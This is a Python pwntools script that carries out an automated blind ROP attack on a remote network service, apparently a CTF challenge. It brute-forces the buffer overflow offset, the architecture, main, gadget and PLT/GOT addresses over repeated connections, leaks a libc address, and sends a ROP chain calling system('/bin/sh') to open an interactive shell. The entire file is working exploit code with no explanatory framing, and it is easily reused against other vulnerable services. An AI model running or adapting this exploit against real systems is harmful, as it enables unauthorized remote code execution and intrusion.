from pwn import *
context.timeout = 3

ip = '172.5.97.210'
port = 10002
msg = 'password?\n'
response = 'game\n'
libc_name = '/lib/x86_64-linux-gnu/libc-2.23.so'

def get_offset():
	i=0
	while True:
		i = i + 1
		print "get offset: ", i
		p = remote(ip, port)
		if msg != '':
			p.recvuntil(msg)
		p.send('A'*i)
		try:
			p.recvuntil(response)
			p.close()
			continue
		except:
			p.close()
			return i-1

def get_arch(offset):
	print "try i386"
	addr = 0x08048000
	while addr < 0x08049000:
		addr = addr + 1
		print "get arch: ",hex(addr)
		p = remote(ip, port)
		if msg != '':
			p.recvuntil(msg)
		p.sendline('A'*offset + p32(addr))
		try:
			if msg != '':
				p.recvuntil(msg)
			p.sendline('A')
			tmp = p.recvuntil(response)
			p.close()
			if response in tmp:
				return ['i386',addr]
		except:
			p.close()
			continue
			
	print "try amd64"		
	addr = 0x400000
	while addr < 0x401000:
		addr = addr + 1
		print "get arch: ",hex(addr)
		p = remote(ip, port)
		if msg != '':
			p.recvuntil(msg)
		p.sendline('A'*offset + p64(addr))
		try:
			if msg != '':
				p.recvuntil(msg)
			p.sendline('A')
			tmp = p.recvuntil(response)
			p.close()
			if response in tmp:
				return ['amd64',addr]
		except:
			p.close()
			continue
	return ["unknow",0]
	
def get_main(offset,start):
	addr = start + 0x30
	while True:
		addr = addr + 1
		print "get main: ",hex(addr)
		p = remote(ip, port)
		if msg != '':
			p.recvuntil(msg)
		p.sendline('A'*offset + p64(addr))
		try:
			if msg != '':
				p.recvuntil(msg)
			p.sendline('A')
			tmp = p.recvuntil(response)
			p.close()
			if response in tmp:
				return addr
		except:
			p.close()
			continue
			
def get_pop6_ret(offset,main):
	addr = main + 0x50
	while True:
		addr = addr + 1
		print "get pop6 ret: ",hex(addr)
		p = remote(ip, port)
		if msg != '':
			p.recvuntil(msg)
		p.sendline('A'*offset + p64(addr) + p64(0)*6 + p64(main))
		try:
			if msg != '':
				p.recvuntil(msg)
			p.sendline('A')
			tmp = p.recvuntil(response)
			p.close()
			if response in tmp:
				return addr
		except:
			p.close()
			continue

def get_write_plt(offset,start):
	addr = start
	while addr > 0x08048000:
		addr = addr - 1
		print "get write plt: ",hex(addr)
		p = remote(ip, port)
		if msg != '':
			p.recvuntil(msg)
		p.sendline('A'*offset + p32(addr) + p32(0) + p32(1) + p32(0x08048000) + p32(4))
		try:
			tmp = p.recvuntil('\x7fELF')
			p.close()
			if 'ELF' in tmp:
				return addr
		except:
			p.close()
			continue
	return 0

def get_write_got(arch,offset,pop6_ret,write_plt):
	if arch == 'amd64':
		addr = 0x600000
		write_got = 0
		while addr < 0x604000:
			addr = addr + 8
			print "get write got: ",hex(addr)
			p = remote(ip, port)
			payload = 'A'*offset + p64(pop6_ret) + p64(0) + p64(1) + p64(addr) + p64(4) + p64(0x400000) + p64(1) + p64(pop6_ret-0x1a)
			if msg != '':
				p.recvuntil(msg)
			p.send(payload)
			try:
				tmp = p.recvuntil('\x7fELF')
				p.close()
				if 'ELF' in tmp:
					write_got = addr
					break
			except:
				p.close()
				continue
		if write_got != 0:
			p = remote(ip, port)
			payload = 'A'*offset + p64(pop6_ret) + p64(0) + p64(1) + p64(write_got) + p64(4) + p64(write_got) + p64(1) + p64(pop6_ret-0x1a)
			if msg != '':
				p.recvuntil(msg)
			p.send(payload)
			write_libc = u64(p.recv(6).ljust(8,'\x00'))
	elif arch == 'i386':
		p = remote(ip, port)
		if msg != '':
			p.recvuntil(msg)
		p.sendline('A'*offset + p32(write_plt) + p32(0) + p32(1) + p32(write_plt) + p32(6))
		write_got = u32(p.recv(6)[2:])
		p.close()
		p = remote(ip, port)
		if msg != '':
			p.recvuntil(msg)
		p.sendline('A'*offset + p32(write_plt) + p32(0) + p32(1) + p32(write_got) + p32(4))
		write_libc = u32(p.recv(4))
		p.close()
	return [write_got,write_libc]
	
def get_puts_plt(arch,offset,start,pop_rdi):
	addr = start
	if arch == 'amd64':
		while addr > 0x400000:
			addr = addr - 1
			print "get puts/printf plt: ",hex(addr)
			p = remote(ip, port)
			if msg != '':
				p.recvuntil(msg)
			p.sendline('A'*offset + p64(pop_rdi) + p64(0x400000) + p64(addr))
			try:
				tmp = p.recvuntil('\x7fELF')
				p.close()
				return addr
			except:
				p.close()
				continue
	elif arch == 'i386':
		while addr > 0x08048000:
			addr = addr - 1
			print "get puts plt: ",hex(addr)
			p = remote(ip, port)
			if msg != '':
				p.recvuntil(msg)
			p.sendline('A'*offset + p32(addr) + p32(0) + p32(0x08048000))
			try:
				tmp = p.recvuntil('\x7fELF')
				p.close()
				if 'ELF' in tmp:
					return addr
			except:
				p.close()
				continue
	return 0
	
def get_puts_got(arch,offset,pop_rdi,puts_plt):
	if arch == 'amd64':
		p = remote(ip, port)
		if msg != '':
			p.recvuntil(msg)
		p.sendline('A'*offset + p64(pop_rdi) + p64(puts_plt) + p64(puts_plt))
		puts_got_offset = p.recv()[2:-1]
		puts_got_offset = u64(puts_got_offset.ljust(8,'\x00'))
		puts_got = puts_got_offset+puts_plt+6
		p.close()		
		p = remote(ip, port)
		if msg != '':
			p.recvuntil(msg)
		p.sendline('A'*offset + p64(pop_rdi) + p64(puts_got) + p64(puts_plt))
		puts_libc = u64(p.recv(6).ljust(8,'\x00'))
		p.close()
	elif arch == 'i386':
		p = remote(ip, port)
		if msg != '':
			p.recvuntil(msg)
		p.sendline('A'*offset + p32(puts_plt) + p32(0) + p32(puts_plt))
		puts_got = u32(p.recv(6)[2:])
		p.close()
		p = remote(ip, port)
		if msg != '':
			p.recvuntil(msg)
		p.sendline('A'*offset + p32(puts_plt) + p32(0) + p32(puts_got))
		puts_libc = u32(p.recv(4).ljust(8,'\x00'))
		p.close()
	return [puts_got,puts_libc]

offset = get_offset()
print "overflow offset: ",hex(offset)
#raw_input()

[arch,start] = get_arch(offset)
print "arch: ",arch
print "start address: ", hex(start)
#raw_input()
if arch == 'unknow':
	print "unknow arch"
	exit(0)

main = get_main(offset,start)
print "main address: ",hex(main)
#raw_input()

pop6_ret = 0
if arch == 'amd64':
	pop6_ret = get_pop6_ret(offset,main)
	print "pop6 ret address: ",hex(pop6_ret)	
	#raw_input()
pop_rdi = pop6_ret + 9

#maybe puts/printf
puts_plt = get_puts_plt(arch,offset,start,pop_rdi)
print "puts plt address: ",hex(puts_plt)
#raw_input()
if puts_plt != 0:
	puts_plt = puts_plt - 6
	[puts_got,puts_libc] = get_puts_got(arch,offset,pop_rdi,puts_plt)
	print "puts got address: ",hex(puts_got)
	print "puts libc address: ",hex(puts_libc)

#maybe write
elif puts_plt == 0:
	write_plt = 0
	puts_got = 0
	if arch == 'i386':
		write_plt = get_write_plt(offset,start) - 6
		print "write plt address: ",hex(write_plt)
		#raw_input()
	[write_got,write_libc] = get_write_got(arch,offset,pop6_ret,write_plt)
	print "write got address: ",hex(write_got)
	print "write libc address: ",hex(write_libc)

print "result:"
print "arch: ",arch
print "start address: ", hex(start)
print "main address: ",hex(main)
if puts_plt != 0:
	print "puts/printf plt address: ",hex(puts_plt)
	print "puts/printf got address: ",hex(puts_got)
	print "puts/printf libc address: ",hex(puts_libc)
	print "pop rdi address: ",hex(pop_rdi)
elif puts_plt == 0:
	if arch == 'i386':
		print "write plt address: ",hex(write_plt)
	else:
		print "pop6 ret address: ",hex(pop6_ret)
	print "write got address: ",hex(write_got)
	print "write libc address: ",hex(write_libc)
print "overflow offset: ",hex(offset)
raw_input()

#get shell
libc = ELF(libc_name)
p = remote(ip, port)
if msg != '':
	p.recvuntil(msg)
	
if arch == 'i386':
	context.clear(arch=arch)
	if puts_plt != 0:
		func_sym = 'puts'
		payload = 'A'*offset + p32(puts_plt) + p32(main) + p32(puts_got)
	elif write_plt != 0:
		func_sym = 'write'
		payload = 'A'*offset + p32(write_plt) + p32(main) + p32(1) + p32(write_got) + p32(4)
	p.send(payload)
	libc.address = u32(p.recv(4)) - libc.symbols[func_sym]

elif arch == 'amd64':
	context.clear(arch=arch)
	if puts_plt != 0:
		func_sym = 'puts'
		payload = 'A'*offset + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
	elif write_got != 0:
		func_sym = 'write'
		payload = 'A'*offset + p64(pop6_ret) + p64(0) + p64(1) + p64(write_got) + p64(6) + p64(write_got) + p64(1) + p64(pop6_ret-0x1a) + p64(0)*7 + p64(main)
	p.send(payload)
	libc.address = u64(p.recv(6).ljust(8,'\x00')) - libc.symbols[func_sym]

#maybe printf
if libc.address & 0xfff != 0:
	libc.address = libc.address + libc.symbols['puts'] - libc.symbols['printf']
	if libc.address & 0xfff != 0:
		print "unknow output function"
		exit(0)
print hex(libc.address)	

rop=ROP(libc)
rop.system(next(libc.search('/bin/sh\0')))
rop.dump()
payload = 'a'*offset + str(rop)
if msg != '':
	p.recvuntil(msg)
p.sendline(payload)
p.interactive()
